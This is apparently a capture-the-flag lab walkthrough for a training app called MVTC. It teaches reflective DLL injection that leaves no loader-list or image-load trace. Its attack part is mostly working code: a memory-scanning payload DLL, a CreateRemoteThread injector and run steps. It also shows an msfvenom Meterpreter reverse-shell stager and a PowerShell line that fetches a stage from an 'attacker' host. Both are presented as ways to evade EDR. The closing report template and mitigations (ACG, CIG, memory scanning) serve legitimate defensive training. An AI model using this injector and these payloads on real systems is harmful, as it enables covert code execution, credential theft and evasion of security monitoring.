# #16 — Reflective / manual-map DLL injection

**Category:** Process injection · **Tier:** HARD · **Points:** 150 · **CWE:** CWE-114

## Prerequisite

Challenge **#13** must be solved first (same prereq-chain as the live lab).

## Objective

Inject your DLL into `MVTC.exe` **without calling `LoadLibraryA` on the target side**. The classic reflective loader (Stephen Fewer, 2008) is the reference. The point: no load-image event in ETW, no entry in the loader list, no path-based module hooks for your DLL.

The reflective DLL still needs to read the `#16` sentinel from managed memory and exfiltrate.

## Prerequisites

- Visual Studio 2022 Build Tools (both x64 and x86 if you want flexibility)
- Already solved #13 (gives you an injector you can reuse by swapping the APC/thread target for a shellcode stub)

---

## The three pieces

1. **A reflective loader stub** (position-independent code, lives inside your DLL)
2. **A reflective-friendly DLL** that imports the stub as its first exported function
3. **An injector** that writes the DLL into the target and calls the stub via `CreateRemoteThread`

Rather than re-implementing Stephen Fewer's loader from scratch, use the reference project:

```
https://github.com/stephenfewer/ReflectiveDLLInjection
```

Clone, build x64 Release, and modify `dllmain.cpp` with the lab-specific heap scanner.

---

## Lab-specific `dllmain.cpp` (replaces reference's dllmain)

```cpp
// dllmain.cpp — drop into ReflectiveDLLInjection/dll/src/
#include "ReflectiveLoader.h"
#include <windows.h>
#include <cstring>

static const char PREFIX[] = "MVTC{v16_ref_";

static void WriteOut(const char* buf, size_t len) {
    HANDLE f = CreateFileA("C:\\Users\\Public\\v16.txt",
        GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (f == INVALID_HANDLE_VALUE) return;
    DWORD w; WriteFile(f, buf, (DWORD)len, &w, nullptr);
    CloseHandle(f);
}

static void HeapScan() {
    SYSTEM_INFO si; GetSystemInfo(&si);
    unsigned char* addr = (unsigned char*)si.lpMinimumApplicationAddress;
    unsigned char* end  = (unsigned char*)si.lpMaximumApplicationAddress;
    MEMORY_BASIC_INFORMATION mbi;
    while (addr < end && VirtualQuery(addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        if (mbi.State == MEM_COMMIT &&
            (mbi.Protect & (PAGE_READWRITE | PAGE_READONLY)) != 0 &&
            !(mbi.Protect & PAGE_GUARD)) {
            __try {
                unsigned char* p   = (unsigned char*)mbi.BaseAddress;
                unsigned char* top = p + mbi.RegionSize - sizeof(PREFIX);
                for (; p < top; ++p) {
                    if (p[0] == 'M' && memcmp(p, PREFIX, sizeof(PREFIX) - 1) == 0) {
                        unsigned char* e = p;
                        while (e < top + 128 && *e != '}') ++e;
                        WriteOut((const char*)p, (size_t)(e - p) + 1);
                        return;
                    }
                }
            } __except (EXCEPTION_EXECUTE_HANDLER) {}
        }
        addr = (unsigned char*)mbi.BaseAddress + mbi.RegionSize;
    }
}

extern "C" BOOL WINAPI DllMain(HINSTANCE, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_ATTACH) {
        CreateThread(nullptr, 0, [](LPVOID)->DWORD { HeapScan(); return 0; },
                     nullptr, 0, nullptr);
    }
    return TRUE;
}
```

Build the x64 reflective DLL from Stephen Fewer's VS solution with the `WIN_X64` configuration → produces `reflective_dll.x64.dll`.

---

## Injector that calls the reflective loader

Save as `inject_16.cpp` (adapts the reference project's `inject.cpp`):

```cpp
// inject_16.cpp — minimal reflective injector (adapted from Stephen Fewer's)
#include <windows.h>
#include <stdio.h>
#include <stdint.h>

// Finds the offset of ReflectiveLoader within the DLL's export table
static DWORD GetReflectiveLoaderOffset(void* dll) {
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((BYTE*)dll +
                            ((IMAGE_DOS_HEADER*)dll)->e_lfanew);
    IMAGE_EXPORT_DIRECTORY* ed = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)dll +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress -
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + 0); // simplified

    // Walk Names, find "ReflectiveLoader"
    DWORD* names    = (DWORD*)((BYTE*)dll + ed->AddressOfNames);
    WORD*  ordinals = (WORD*) ((BYTE*)dll + ed->AddressOfNameOrdinals);
    DWORD* funcs    = (DWORD*)((BYTE*)dll + ed->AddressOfFunctions);

    for (DWORD i = 0; i < ed->NumberOfNames; ++i) {
        const char* name = (const char*)((BYTE*)dll + names[i]);
        if (strcmp(name, "ReflectiveLoader") == 0) {
            return funcs[ordinals[i]];
        }
    }
    return 0;
}

int wmain(int argc, wchar_t** argv) {
    if (argc != 3) {
        wprintf(L"usage: inject_16.exe <pid> <path-to-reflective_dll.x64.dll>\n");
        return 1;
    }
    DWORD pid = (DWORD)_wtoi(argv[1]);

    HANDLE df = CreateFileW(argv[2], GENERIC_READ, FILE_SHARE_READ, nullptr,
                            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    DWORD size = GetFileSize(df, nullptr);
    void* dllBytes = HeapAlloc(GetProcessHeap(), 0, size);
    DWORD read; ReadFile(df, dllBytes, size, &read, nullptr);
    CloseHandle(df);

    DWORD reflectiveOffset = GetReflectiveLoaderOffset(dllBytes);
    if (!reflectiveOffset) { wprintf(L"ReflectiveLoader export not found\n"); return 2; }

    HANDLE p = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    LPVOID remote = VirtualAllocEx(p, nullptr, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(p, remote, dllBytes, size, nullptr);

    HANDLE th = CreateRemoteThread(p, nullptr, 0,
        (LPTHREAD_START_ROUTINE)((BYTE*)remote + reflectiveOffset),
        remote, 0, nullptr);
    WaitForSingleObject(th, 10000);

    DWORD exit; GetExitCodeThread(th, &exit);
    wprintf(L"reflective loader returned 0x%lx\n", exit);
    CloseHandle(th); CloseHandle(p);
    return 0;
}
```

Build: `cl /EHsc /O2 /nologo inject_16.cpp /Fe:inject_16.exe`

---

## Run

```powershell
# 1. Launch MVTC, log in.
# 2. Find PID
Get-Process MVTC | Select-Object -First 1 Id

# 3. Fire the injector
.\inject_16.exe 12345 "C:\path\to\reflective_dll.x64.dll"

# 4. Expected output in the injector:
#    reflective loader returned 0x180000000  (or similar HMODULE)

# 5. Collect
type C:\Users\Public\v16.txt
```

Expected: `MVTC{v16_ref_<...>}` → submit for `+150 pts`.

---

## Why no `LoadLibraryA`

The reflective loader stub manually:
1. Resolves `kernel32!LoadLibraryA`, `GetProcAddress`, `VirtualAlloc`, `VirtualProtect` via PEB walking (no `GetModuleHandle` needed)
2. Allocates a fresh region
3. Copies the DLL image into it with proper section-by-section mapping
4. Applies relocations (`.reloc` table)
5. Resolves imports
6. Calls the DLL's `DllMain` with `DLL_PROCESS_ATTACH`

ETW's `LoadImage` event doesn't fire. The loader-list doesn't carry your module. `EnumProcessModules` won't show it. That's the whole point.

---

## Common failure modes

| Symptom | Fix |
|---|---|
| `ReflectiveLoader export not found` | DLL was built without the reflective loader; use Fewer's reference project |
| `remote thread returned 0x0` | Loader bailed on an import. Reduce the DLL's imports to the minimum (just `kernel32` + `user32`) |
| Target process crashes | 32/64 bit mismatch — rebuild DLL and injector for x64 |

---

---

## Concept — what this attack actually is

Reflective DLL injection sidesteps the Windows loader entirely. Instead of calling `LoadLibraryA` on the target side (which creates a file-backed image mapping, fires `Image Load` ETW events, and adds the DLL to `PEB->Ldr`), the attacker ships a DLL whose first exported function is a **custom loader** that:
- Walks the PEB to find `kernel32.dll` and resolve `LoadLibraryA`, `GetProcAddress`, `VirtualAlloc`, `VirtualProtect`
- Allocates a region in the target's address space
- Copies the DLL image section-by-section manually
- Applies `.reloc` fixups
- Resolves imports via `GetProcAddress`
- Calls `DllMain`

The result: the DLL is loaded, running, with imports resolved, but **nothing in the loader list says so**. `EnumProcessModules` won't see it. `Image Load` ETW events don't fire for it. Path-based module hooks miss it.

**Why attackers use it:** EDR hooks almost always sit on `LdrLoadDll` or `LoadLibrary*`. Reflective loading bypasses all of them. This is why reflective DLL techniques underpin Cobalt Strike's `beacon_load` and essentially all modern C2 implants.

---

## Discovery — how to spot this in a real target

In defensive review, this is really a question of what tooling the target would see. For an attacker assessing MVTC:
1. Does MVTC enable **ACG (Arbitrary Code Guard)**? → `SetProcessMitigationPolicy(ProcessDynamicCodePolicy)` with `ProhibitDynamicCode=true` kills reflective loading (no `PAGE_EXECUTE_READWRITE` allocations allowed)
2. Does MVTC enable **CIG (Code Integrity Guard)**? → `MicrosoftSignedOnly=true` blocks even manual image loads of unsigned content
3. Does MVTC walk its own PEB module list and compare to a known manifest at startup? → virtually no apps do this, but a hardened one would

For MVTC with #5 (missing mitigations) already true, reflective loading is the stealthy upgrade of #13.

---

## Impact demonstrations

### 1. Pop calc

Modify the reflective DLL's `DllMain` to `WinExec("calc.exe", SW_SHOW);` → inject → calc opens as MVTC child but no `Image Load` event fires for your DLL (verify with `logman` or sysinternals `Sysmon` running event 7).

### 2. Reverse shell with Cobalt Strike pattern

For a Metasploit-flavoured demo:

```bash
# Generate a reflective DLL stager with msfvenom
msfvenom -p windows/x64/meterpreter_reverse_tcp \
  LHOST=10.0.0.5 LPORT=4444 \
  -f dll -o reflective_meter.dll
```

Load it with your reflective injector (same `inject_16.exe` from above — it expects the DLL to export `ReflectiveLoader`; msfvenom's does). The Meterpreter session appears inside MVTC with the same identity, and `tasklist /m` on the victim box doesn't show `reflective_meter.dll` loaded.

### 3. In-process credential theft without touching disk

Reflective loader can map a DLL from a network stream, Base64-decoded blob, or shellcode in a PowerShell variable. Classic APT pattern:

```powershell
$dllBytes = (Invoke-WebRequest -Uri https://attacker/stage.b64).Content
$bytes = [Convert]::FromBase64String($dllBytes)
# ... inject bytes via known injector pattern, call reflective entrypoint
```

Nothing writes to disk; nothing shows up in `Get-ChildItem` scans; EDR hooks on file writes see nothing.

---

## Report writeup template

**Finding title:** Reflective / manual-map DLL injection (loader-less code execution)

**Severity:** High (CVSS 8.1)

**CWE:** CWE-114

**Description:** The MVTC process does not enable **Arbitrary Code Guard** (`ProhibitDynamicCode`) or **Code Integrity Guard** (`MicrosoftSignedOnly`). An attacker with local access can inject a DLL into MVTC via a reflective loader that **does not call `LoadLibraryA` on the target side**, bypassing EDR hooks on module-load events and loader-list enumeration. The loaded module does not appear in `EnumProcessModules`, `tasklist /m`, or `Image Load` ETW events.

**Impact:** All impact of #13 plus **evasion of standard endpoint telemetry**. In production environments relying on EDR module-load alerts, this attack would not fire a single alert.

**Remediation:** Enable ACG + CIG. Deploy EDR tooling that performs **memory region scanning** (not loader-list enumeration) for anomalous `PAGE_EXECUTE_*` + `MEM_PRIVATE` regions containing PE headers.

---

## Secure code fix

- CFG + CET shadow stacks (ROP into `VirtualAlloc` becomes impractical)
- `SetProcessMitigationPolicy(ProcessImageLoadPolicy)` with `NoLowMandatoryLabelImages = true`
- Hunt via **memory scanning** (not loader-list): walk committed PRIVATE pages with `PAGE_EXECUTE_*` and look for PE signatures in `MEM_PRIVATE` regions. An EDR like Defender for Endpoint does this on a schedule.
- Enable **Arbitrary Code Guard (ACG)** via `ProcessDynamicCodePolicy.ProhibitDynamicCode = true` — kills the write-then-execute pattern. WPF cannot use ACG today (JIT), but non-UI processes can.
